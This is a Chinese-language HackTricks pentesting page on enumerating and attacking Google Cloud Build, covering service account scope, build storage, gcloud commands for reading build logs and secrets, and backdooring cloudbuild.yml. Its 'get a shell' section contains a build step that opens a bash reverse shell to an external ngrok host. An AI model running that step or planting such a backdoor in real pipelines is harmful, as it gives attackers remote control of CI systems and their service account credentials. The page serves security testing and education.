# GCP - Cloud Build枚举

<details>

<summary><strong>支持HackTricks并获得福利！</strong></summary>

* 如果您想在HackTricks中看到您的公司广告，或者如果您想访问PEASS的最新版本或下载PDF版本的HackTricks，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFT**](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我在**Twitter**上的🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) **和** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github仓库提交PR来分享您的黑客技巧。**

</details>

## 基本信息

Google Cloud Build是一个托管的CI/CD平台，可以自动化软件构建和发布流程，与源代码仓库集成，并支持各种编程语言。它允许开发人员在提供构建步骤和工作流程自定义的同时，自动构建、测试和部署代码。

每个Cloud Build触发器都与一个Cloud仓库相关联，或直接与外部仓库（Github、Bitbucket或Gitlab）连接。

可以配置Cloud Build以**要求构建执行的批准**（默认情况下禁用）。

**服务帐号具有`cloud-platform`范围的权限**，因此它可以使用所有权限。如果**未指定SA**（例如在提交时），将使用**默认SA** `<proj-number>@cloudbuild.gserviceaccount.com`。

{% hint style="success" %}
我无法找到任何从这里或Cloud仓库窃取Github/Bitbucket令牌的方法，因为当下载仓库时，它是通过[https://source.cloud.google.com/](https://source.cloud.google.com/) URL访问的，而客户端无法访问Github。
{% endhint %}

### 存储

有时，Cloud Build会**生成一个新的存储来存储触发器的文件**。例如，在GCP提供的示例中就会发生这种情况：
```bash
git clone https://github.com/GoogleCloudBuild/cloud-console-sample-build && \
cd cloud-console-sample-build && \
gcloud builds submit --config cloudbuild.yaml --region=global
```
创建了一个名为[security-devbox_cloudbuild](https://console.cloud.google.com/storage/browser/security-devbox_cloudbuild;tab=objects?forceOnBucketsSortingFiltering=false\&project=security-devbox)的存储桶，用于存储要使用的`.tgz`文件。

### 获取shell
```yaml
steps:
- name: bash
script: |
#!/usr/bin/env bash
bash -i >& /dev/tcp/5.tcp.eu.ngrok.io/12395 0>&1
options:
logging: CLOUD_LOGGING_ONLY
```
### 枚举

您可以在构建配置和日志中找到**敏感信息**。
```bash
gcloud builds list
gcloud builds describe <build-uuid> # Get even the build yaml if defined in there
gcloud builds log <build-uuid> # Get build logs
```
## 提权

{% content-ref url="../../gcp-security/gcp-privilege-escalation/gcp-cloudbuild-privesc.md" %}
[gcp-cloudbuild-privesc.md](../../gcp-security/gcp-privilege-escalation/gcp-cloudbuild-privesc.md)
{% endcontent-ref %}

### 未经身份验证的访问

### cloudbuild.yml

如果您获得了对包含名为**`cloudbuild.yml`**的文件的写访问权限，您可以在该文件中**植入后门**，该文件指定了在Cloud Build中将要执行的**命令**，从而窃取机密信息，破坏操作以及危及**Cloud Build服务帐户**。

{% hint style="info" %}
请注意，GCP有一个选项，允许管理员通过“评论控制”来控制来自外部PR的构建系统的执行。评论控制是一个功能，协作者/项目所有者**需要在评论中添加“/gcbrun”来触发构建**，使用此功能本质上可以防止任何人在互联网上触发您的构建系统。
{% endhint %}

有关一些相关信息，您可以查看关于如何攻击Github Actions的页面（类似于此）：

{% content-ref url="../../../pentesting-ci-cd/github-security/abusing-github-actions/" %}
[abusing-github-actions](../../../pentesting-ci-cd/github-security/abusing-github-actions/)
{% endcontent-ref %}

<details>

<summary><strong>支持HackTricks并获得福利！</strong></summary>

* 如果您想在HackTricks中看到您的**公司广告**，或者如果您想访问**PEASS的最新版本或下载PDF格式的HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS和HackTricks周边产品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们的独家[**NFT**](https://opensea.io/collection/the-peass-family)收藏品
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram群组**](https://t.me/peass) 或 **关注**我的 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) **和** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **github仓库提交PR来分享您的黑客技巧。**

</details>
